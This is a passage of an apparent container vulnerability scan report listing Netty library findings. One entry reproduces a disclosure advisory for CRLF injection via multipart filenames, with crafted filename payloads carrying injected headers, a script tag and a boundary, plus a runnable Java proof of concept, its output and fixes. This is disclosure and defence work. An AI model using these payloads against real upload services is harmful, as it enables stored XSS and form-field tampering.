                        │      │                            d54f09aafb3326ca458a 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59921 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:9040dda19312bcf9de3f3e592122d726a793cf802fd9694de5975
                        │      │                   1b2fb417495 
                        │      ├ Title           : Netty: CRLF Injection via Multipart Filename in Netty
                        │      │                   HttpPostRequestEncoder 
                        │      ├ Description     : # Security Vulnerability Report: CRLF Injection via
                        │      │                   Multipart Filename in Netty HttpPostRequestEncoder
                        │      │                   
                        │      │                   ## 1. Vulnerability Summary
                        │      │                   | Field | Value |
                        │      │                   |-------|-------|
                        │      │                   | **Product** | Netty |
                        │      │                   | **Version** | 4.2.12.Final (and all prior versions with
                        │      │                   codec-http multipart) |
                        │      │                   | **Component** |
                        │      │                   `io.netty.handler.codec.http.multipart.HttpPostRequestEncode
                        │      │                   r` |
                        │      │                   | **Vulnerability Type** | CWE-93: Improper Neutralization
                        │      │                   of CRLF Sequences / CWE-113: HTTP Response Splitting |
                        │      │                   | **Impact** | MIME Header Injection / Content-Type Spoofing
                        │      │                    / XSS via Content-Disposition |
                        │      │                   | **CVSS 3.1 Score** | **8.1 (High)** |
                        │      │                   | **CVSS 3.1 Vector** |
                        │      │                   `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
                        │      │                   | **Attack Vector** | Network |
                        │      │                   | **Attack Complexity** | Low |
                        │      │                   | **Privileges Required** | Low (attacker must be able to
                        │      │                   upload files with controlled filenames) |
                        │      │                   | **User Interaction** | None |
                        │      │                   | **Scope** | Unchanged |
                        │      │                   | **Confidentiality Impact** | High |
                        │      │                   | **Integrity Impact** | High |
                        │      │                   | **Availability Impact** | None |
                        │      │                   ## 2. Affected Components
                        │      │                   The following classes in the `codec-http` module are
                        │      │                   affected:
                        │      │                   -
                        │      │                   r` — directly concatenates unvalidated filename/name into
                        │      │                   `Content-Disposition` MIME headers (lines 519, 633, 674,
                        │      │                   682, 686-688)
                        │      │                   - `io.netty.handler.codec.http.multipart.DiskFileUpload` —
                        │      │                   `setFilename()` only checks null (line 78)
                        │      │                   - `io.netty.handler.codec.http.multipart.MemoryFileUpload` —
                        │      │                    `setFilename()` only checks null (line 60)
                        │      │                   - `io.netty.handler.codec.http.multipart.MixedFileUpload` —
                        │      │                   `setFilename()` delegates without validation (line 62)
                        │      │                   ## 3. Vulnerability Description
                        │      │                   Netty's `HttpPostRequestEncoder` constructs multipart HTTP
                        │      │                   request bodies by directly concatenating user-supplied
                        │      │                   filenames and field names into `Content-Disposition` MIME
                        │      │                   headers **without validating or sanitizing CRLF characters**
                        │      │                    (`\r\n`). Since MIME headers are delimited by CRLF, an
                        │      │                   attacker who controls the filename can inject arbitrary MIME
                        │      │                    headers into the multipart body part.
                        │      │                   ### Root Cause
                        │      │                   In `HttpPostRequestEncoder.java`, multiple code paths
                        │      │                   directly embed `fileUpload.getFilename()` into header
                        │      │                   strings:
                        │      │                   ```java
                        │      │                   // Line 674 (attachment mode):
                        │      │                   internal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + ":
                        │      │                   "
                        │      │                       + HttpHeaderValues.ATTACHMENT + "; "
                        │      │                       + HttpHeaderValues.FILENAME + "=\"" +
                        │      │                   fileUpload.getFilename() + "\"\r\n");
                        │      │                   //                                       
                        │      │                   ^^^^^^^^^^^^^^^^^^^^^^^^ NO VALIDATION
                        │      │                   // Lines 686-688 (form-data mode):
                        │      │                   internal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + ": "
                        │      │                    + HttpHeaderValues.FORM_DATA + "; "
                        │      │                       + HttpHeaderValues.NAME + "=\"" + fileUpload.getName() +
                        │      │                    "\"; "
                        │      │                   // Line 519 (attribute name):
                        │      │                       + HttpHeaderValues.NAME + "=\"" + attribute.getName() +
                        │      │                   "\"\r\n");
                        │      │                   //                                    ^^^^^^^^^^^^^^^^^ NO
                        │      │                   VALIDATION
                        │      │                   ```
                        │      │                   The `setFilename()` method in all `FileUpload`
                        │      │                   implementations only checks for null:
                        │      │                   // DiskFileUpload.java:77-79
                        │      │                   public void setFilename(String filename) {
                        │      │                       this.filename = ObjectUtil.checkNotNull(filename,
                        │      │                   "filename");
                        │      │                       // NO CRLF VALIDATION
                        │      │                   }
                        │      │                   ### Comparison with Similar Fixed CVEs
                        │      │                   This vulnerability follows the same pattern as:
                        │      │                   | CVE | Component | Fix |
                        │      │                   |-----|-----------|-----|
                        │      │                   | **GHSA-jq43-27x9-3v86** | SmtpRequestEncoder — SMTP
                        │      │                   command injection | Added CRLF validation in
                        │      │                   `SmtpUtils.validateSMTPParameters()` |
                        │      │                   | **GHSA-84h7-rjj3-6jx4** | HttpRequestEncoder — CRLF in URI
                        │      │                    | Added `HttpUtil.validateRequestLineTokens()` |
                        │      │                   The multipart encoder has **no equivalent validation** for
                        │      │                   filenames or field names.
                        │      │                   ## 4. Exploitability Prerequisites
                        │      │                   This vulnerability is exploitable when:
                        │      │                   1. The application uses Netty's `HttpPostRequestEncoder` to
                        │      │                   construct multipart HTTP requests
                        │      │                   2. The filename of an uploaded file is derived from
                        │      │                   user-controlled input
                        │      │                   3. The application does **not** perform its own CRLF
                        │      │                   sanitization on filenames
                        │      │                   **Common affected patterns**:
                        │      │                   - File upload proxies that forward user-supplied filenames
                        │      │                   - API gateways that construct multipart requests from
                        │      │                   incoming parameters
                        │      │                   - Microservice communication that passes filenames between
                        │      │                   services
                        │      │                   - Testing/automation frameworks that use Netty HTTP client
                        │      │                   with user-defined filenames
                        │      │                   ## 5. Attack Scenarios
                        │      │                   ### Scenario 1: Content-Type Override via Filename
                        │      │                   Injection
                        │      │                   An attacker uploads a file with a crafted filename to
                        │      │                   override the Content-Type of the multipart body part,
                        │      │                   potentially enabling stored XSS:
                        │      │                   String maliciousFilename = "photo.jpg\"\r\nContent-Type:
                        │      │                   text/html\r\n\r\n<script>alert(document.cookie)</script>\r\n
                        │      │                   --";
                        │      │                   DiskFileUpload upload = new DiskFileUpload(
                        │      │                       "avatar", maliciousFilename, "image/jpeg", "binary",
                        │      │                   UTF_8, fileSize);
                        │      │                   **Wire format:**
                        │      │                   --boundary
                        │      │                   content-disposition: form-data; name="avatar";
                        │      │                   filename="photo.jpg"
                        │      │                   Content-Type: text/html                    <-- INJECTED:
                        │      │                   overrides image/jpeg
                        │      │                   <script>alert(document.cookie)</script>    <-- INJECTED: XSS
                        │      │                    payload
                        │      │                   --"
                        │      │                   content-type: image/jpeg                   <-- Original (now
                        │      │                    ignored by many parsers)
                        │      │                   ...
                        │      │                   If the receiving server parses the **first** `Content-Type`,
                        │      │                    the file is treated as HTML instead of JPEG, enabling XSS
                        │      │                   when the file is served back.
                        │      │                   ### Scenario 2: Arbitrary MIME Header Injection
                        │      │                   String filename = "doc.pdf\"\r\nX-Custom-Auth:
                        │      │                   admin-token-12345\r\nX-Bypass-Check: true";
                        │      │                   Injects arbitrary headers into the multipart body part that
                        │      │                   may be processed by downstream middleware or application
                        │      │                   logic.
                        │      │                   ### Scenario 3: Multipart Boundary Confusion
                        │      │                   String filename = "file.txt\"\r\n\r\nmalicious body
                        │      │                   content\r\n--boundary\r\nContent-Disposition: form-data;
                        │      │                   name=\"secret";
                        │      │                   By injecting a new boundary delimiter, the attacker can:
                        │      │                   - Terminate the current body part prematurely
                        │      │                   - Start a new body part with a different field name
                        │      │                   - Override form fields processed by the server
                        │      │                   ## 6. Proof of Concept
                        │      │                   ### Full Runnable PoC Source Code
                        │      │                   (MultipartFilenameInjectionPoC.java)
                        │      │                   import io.netty.buffer.ByteBuf;
                        │      │                   import io.netty.buffer.Unpooled;
                        │      │                   import io.netty.handler.codec.http.*;
                        │      │                   import io.netty.handler.codec.http.multipart.*;
                        │      │                   import java.io.File;
                        │      │                   import java.io.FileWriter;
                        │      │                   import java.nio.charset.StandardCharsets;
                        │      │                   /**
                        │      │                    * PoC: HTTP Multipart Content-Disposition Header Injection
                        │      │                   via Filename
                        │      │                    *
                        │      │                    * Demonstrates that HttpPostRequestEncoder does not
                        │      │                   validate filenames
                        │      │                    * for CRLF characters, allowing injection of arbitrary MIME
                        │      │                    headers
                        │      │                    * into multipart form data.
                        │      │                    */
                        │      │                   public class MultipartFilenameInjectionPoC {
                        │      │                       public static void main(String[] args) throws Exception
                        │      │                   {
                        │      │                           System.out.println("=== Netty Multipart Filename
                        │      │                   CRLF Injection PoC ===\n");
                        │      │                           testFilenameInjection();
                        │      │                           System.out.println("\n=== PoC Complete ===");
                        │      │                       }
                        │      │                       static void testFilenameInjection() throws Exception {
                        │      │                           System.out.println("[TEST 1] Filename CRLF Injection
                        │      │                    in Content-Disposition");
                        │      │                          
                        │      │                   System.out.println("----------------------------------------
                        │      │                   ---------------");
                        │      │                           // Create a temporary file for upload
                        │      │                           File tempFile = File.createTempFile("test",
                        │      │                   ".txt");
                        │      │                           tempFile.deleteOnExit();
                        │      │                           try (FileWriter fw = new FileWriter(tempFile)) {
                        │      │                               fw.write("test content");
                        │      │                           }
                        │      │                           // Malicious filename with CRLF to inject
                        │      │                   Content-Type header
                        │      │                           String maliciousFilename =
                        │      │                               "innocent.txt\"\r\nContent-Type:
                        │      │                   text/html\r\nX-Injected: true\r\n\r\n" +
                        │      │                               "<script>alert(1)</script>\r\n--";
                        │      │                           HttpRequest request = new DefaultHttpRequest(
                        │      │                               HttpVersion.HTTP_1_1, HttpMethod.POST,
                        │      │                   "/upload");
                        │      │                           HttpPostRequestEncoder encoder = new
                        │      │                   HttpPostRequestEncoder(
                        │      │                                   new DefaultHttpDataFactory(false), request,
                        │      │                   true,
                        │      │                                   StandardCharsets.UTF_8,
                        │      │                   HttpPostRequestEncoder.EncoderMode.RFC3986);
                        │      │                           DiskFileUpload fileUpload = new DiskFileUpload(
                        │      │                                   "file", maliciousFilename,
                        │      │                   "application/octet-stream",
                        │      │                                   "binary", StandardCharsets.UTF_8,
                        │      │                   tempFile.length());
                        │      │                           fileUpload.setContent(tempFile);
                        │      │                           encoder.addBodyHttpData(fileUpload);
                        │      │                           encoder.finalizeRequest();
                        │      │                           // Read the encoded multipart body
                        │      │                           StringBuilder body = new StringBuilder();
                        │      │                           while (!encoder.isEndOfInput()) {
                        │      │                               HttpContent chunk =
                        │      │                   encoder.readChunk(Unpooled.buffer().alloc());
                        │      │                               if (chunk != null) {
                        │      │                                  
                        │      │                   body.append(chunk.content().toString(StandardCharsets.UTF_8)
                        │      │                   );
                        │      │                                   chunk.release();
                        │      │                               }
                        │      │                           encoder.cleanFiles();
                        │      │                           String encoded = body.toString();
                        │      │                           System.out.println("Malicious filename: " +
                        │      │                               maliciousFilename.replace("\r",
                        │      │                   "\\r").replace("\n", "\\n"));
                        │      │                           System.out.println();
                        │      │                           System.out.println("Encoded multipart body:");
                        │      │                           System.out.println("---");
                        │      │                           for (String line : encoded.split("\n", -1)) {
                        │      │                               System.out.println("  " + line.replace("\r",
                        │      │                   "\\r"));
                        │      │                           boolean hasInjectedHeader =
                        │      │                   encoded.contains("X-Injected: true");
                        │      │                           boolean hasInjectedScript =
                        │      │                   encoded.contains("<script>");
                        │      │                           System.out.println("Injected X-Injected header: " +
                        │      │                   hasInjectedHeader);
                        │      │                           System.out.println("Injected script tag: " +
                        │      │                   hasInjectedScript);
                        │      │                           System.out.println("VULNERABLE: " +
                        │      │                               ((hasInjectedHeader || hasInjectedScript) ?
                        │      │                                   "YES - MIME header injection!" : "NO"));
                        │      │                           tempFile.delete();
                        │      │                   ### How to Compile and Run
                        │      │                   ```bash
                        │      │                   # Build Netty (skip tests)
                        │      │                   ./mvnw install -pl
                        │      │                   common,buffer,codec,codec-base,codec-http,transport
                        │      │                   -DskipTests \
                        │      │                     -Dcheckstyle.skip=true -Denforcer.skip=true
                        │      │                   -Djapicmp.skip=true \
                        │      │                     -Danimal.sniffer.skip=true -Drevapi.skip=true
                        │      │                   -Dforbiddenapis.skip=true \
                        │      │                     -Dspotbugs.skip=true -q
                        │      │                   # Set classpath
                        │      │                   JARS=$(find ~/.m2/repository/io/netty -name "netty-*.jar"
                        │      │                   -path "*/4.2.12.Final/*" \
                        │      │                     | grep -v sources | grep -v javadoc | tr '\n' ':')
                        │      │                   # Compile and run
                        │      │                   javac -cp "$JARS" MultipartFilenameInjectionPoC.java
                        │      │                   java -cp "$JARS:." MultipartFilenameInjectionPoC
                        │      │                   ### PoC Execution Output (Verified on Netty 4.2.12.Final)
                        │      │                   === Netty Multipart Filename CRLF Injection PoC ===
                        │      │                   [TEST 1] Filename CRLF Injection in Content-Disposition
                        │      │                   -------------------------------------------------------
                        │      │                   Malicious filename: innocent.txt"\r\nContent-Type:
                        │      │                   text/html\r\nX-Injected:
                        │      │                   true\r\n\r\n<script>alert(1)</script>\r\n--
                        │      │                   Encoded multipart body:
                        │      │                   ---
                        │      │                     --88aaade41dbb9f9f\r
                        │      │                     content-disposition: form-data; name="file";
                        │      │                   filename="innocent.txt"\r
                        │      │                     Content-Type: text/html\r                          <--
                        │      │                   INJECTED
                        │      │                     X-Injected: true\r                                 <--
                        │      │                     \r
                        │      │                     <script>alert(1)</script>\r                        <--
                        │      │                   INJECTED XSS
                        │      │                     --"\r
                        │      │                     content-length: 12\r
                        │      │                     content-type: application/octet-stream\r
                        │      │                     content-transfer-encoding: binary\r
                        │      │                     test content\r
                        │      │                     --88aaade41dbb9f9f--\r
                        │      │                   Injected X-Injected header: true
                        │      │                   Injected script tag: true
                        │      │                   VULNERABLE: YES - MIME header injection!
                        │      │                   === PoC Complete ===
                        │      │                   ## 7. Impact Analysis
                        │      │                   | Impact Category | Description |
                        │      │                   |----------------|-------------|
                        │      │                   | **Confidentiality** | HIGH — Injected headers may bypass
                        │      │                   access controls or leak tokens |
                        │      │                   | **Integrity** | HIGH — Content-Type override enables
                        │      │                   stored XSS; field name injection allows form data
                        │      │                   manipulation |
                        │      │                   | **Content-Type Spoofing** | Override
                        │      │                   `application/octet-stream` to `text/html` to serve
                        │      │                   executable content |
                        │      │                   | **Stored XSS** | Inject `<script>` tags via Content-Type
                        │      │                   override when uploaded files are served back |
                        │      │                   | **Form Field Override** | Inject new multipart boundaries
                        │      │                   to create/override form fields |
                        │      │                   | **Downstream Injection** | Custom MIME headers may affect
                        │      │                   middleware, CDN, or storage layer behavior |
                        │      │                   ## 8. Remediation Recommendations
                        │      │                   ### Option 1: Validate in FileUpload.setFilename()
                        │      │                   (Recommended)
                        │      │                   // DiskFileUpload.java / MemoryFileUpload.java /
                        │      │                   MixedFileUpload.java
                        │      │                       ObjectUtil.checkNotNull(filename, "filename");
                        │      │                       for (int i = 0; i < filename.length(); i++) {
                        │      │                           char c = filename.charAt(i);
                        │      │                           if (c == '\r' || c == '\n') {
                        │      │                               throw new IllegalArgumentException(
                        │      │                                   "filename contains prohibited CRLF character
                        │      │                    at index " + i);
                        │      │                       this.filename = filename;
                        │      │                   ### Option 2: Sanitize in HttpPostRequestEncoder
                        │      │                   (Defense-in-Depth)
                        │      │                   Escape or reject CRLF characters when building
                        │      │                   Content-Disposition headers:
                        │      │                   // HttpPostRequestEncoder.java - add helper method
                        │      │                   private static String sanitizeHeaderParam(String value) {
                        │      │                       for (int i = 0; i < value.length(); i++) {
                        │      │                           char c = value.charAt(i);
                        │      │                           if (c == '\r' || c == '\n' || c == '"') {
                        │      │                               throw new ErrorDataEncoderException(
                        │      │                                   "Multipart parameter contains prohibited
                        │      │                   character at index " + i);
                        │      │                       return value;
                        │      │                   // Then use in Content-Disposition construction:
                        │      │                   internal.addValue(... + "=\"" +
                        │      │                   sanitizeHeaderParam(fileUpload.getFilename()) + "\"\r\n");
                        │      │                   ### Option 3: RFC 2231/5987 Encoding for Filenames
                        │      │                   Use proper RFC 2231 encoding for filenames with special
                        │      │                   characters:
                        │      │                   // Encode filename per RFC 5987:
                        │      │                   // filename*=UTF-8''encoded%20filename
                        │      │                   String encodedFilename = "UTF-8''" +
                        │      │                   URLEncoder.encode(filename, "UTF-8");
                        │      │                   internal.addValue(... + "filename*=" + encodedFilename +
                        │      │                   "\r\n");
                        │      │                   ## 9. References
                        │      │                   - [RFC 2183: Content-Disposition Header
                        │      │                   Field](https://tools.ietf.org/html/rfc2183)
                        │      │                   - [RFC 7578: Returning Values from Forms:
                        │      │                   multipart/form-data](https://tools.ietf.org/html/rfc7578)
                        │      │                   - [RFC 5987: Character Set and Language Encoding for HTTP
                        │      │                   Header Field
                        │      │                   Parameters](https://tools.ietf.org/html/rfc5987)
                        │      │                   - [CWE-93: Improper Neutralization of CRLF
                        │      │                   Sequences](https://cwe.mitre.org/data/definitions/93.html)
                        │      │                   - [CWE-113: Improper Neutralization of CRLF Sequences in
                        │      │                   HTTP
                        │      │                   Headers](https://cwe.mitre.org/data/definitions/113.html)
                        │      │                   - [GHSA-jq43-27x9-3v86: Netty SMTP Command Injection (same
                        │      │                   pattern)](https://github.com/netty/netty/security/advisories
                        │      │                   /GHSA-jq43-27x9-3v86)
                        │      │                   - [GHSA-84h7-rjj3-6jx4: Netty HTTP CRLF Injection (same
                        │      │                   /GHSA-84h7-rjj3-6jx4) 
                        │      ├ Severity        : MEDIUM 
                        │      ├ VendorSeverity   ─ ghsa: 2 
                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N 
                        │      │                         ╰ V3Score : 5.7 
                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
                        │                         ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.
                        │                         │      136.Final 
                        │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.
                        │                         │      16.Final 
                        │                         ╰ [3]: https://github.com/netty/netty/security/advisories/GHS
                        │                                A-gcjf-9mgh-3p7g 
                        ╰ [11] ╭ VulnerabilityID : CVE-2026-59900 
                               ├ VendorIDs        ─ [0]: GHSA-c69g-56f8-xwqj 
                               ├ PkgName         : io.netty:netty-codec-http2 
                               ├ PkgPath         : openaf/Kube/netty-codec-http2-4.2.15.Final.jar 
                               ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http2@4.2.15.Final 
                               │                  ╰ UID : c30b5fd76294dbfd 
                               ├ InstalledVersion: 4.2.15.Final 
                               ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
                               ├ Status          : fixed 
                               ├ Layer            ╭ Digest: sha256:3f40a027dde1d3be420bf78167d8778929cf9021943d
                               │                  │         384ed4f1eee4bd11e128 
                               │                  ╰ DiffID: sha256:7c3540a7fa06352170fc4be5b43ac295d368f87695f9
                               │                            d54f09aafb3326ca458a 
                               ├ SeveritySource  : ghsa 
                               ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59900 
                               ├ DataSource       ╭ ID  : ghsa 
                               │                  ├ Name: GitHub Security Advisory Maven 
                               │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                               │                          cosystem%3Amaven 
                               ├ Fingerprint     : sha256:a1123df2522b02cd29e9f9c3ae45a69eaa655c6635bd740523ca8
                               │                   ab08ec76dd6 
                               ├ Title           : Netty: [codec-http2] Lack of Host Header Deduplication in
                               │                   HTTP/2→HTTP/1.x Translation Leads to Request Routing
                               │                   Bypass 
                               ├ Description     : Netty's HTTP/2-to-HTTP/1.x translation layer
                               │                   (`Http2StreamFrameToHttpObjectCodec` and
                               │                   `InboundHttp2ToHttpAdapter`) fails to deduplicate or
                               │                   validate `Host` headers when an HTTP/2 client supplies both
                               │                   the `:authority` pseudo-header and a literal `host` header
                               │                   in a single HEADERS frame. The translator maps `:authority`
                               │                   to `Host` and separately copies the literal `host` header,
                               │                   producing an `HttpRequest` object containing two `Host`
                               │                   headers with attacker-controlled differing values. 
                               ├ Severity        : MEDIUM 
                               ├ VendorSeverity   ─ ghsa: 2 
                               ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
                               │                         │            :N/VA:N/SC:L/SI:L/SA:N 
                               │                         ╰ V40Score : 6.9 
                               ╰ References       ╭ [0]: https://github.com/netty/netty 
                                                  ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.
                                                  │      136.Final 
                                                  ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.
                                                  │      16.Final 
                                                  ╰ [3]: https://github.com/netty/netty/security/advisories/GHS
                                                         A-c69g-56f8-xwqj 
```
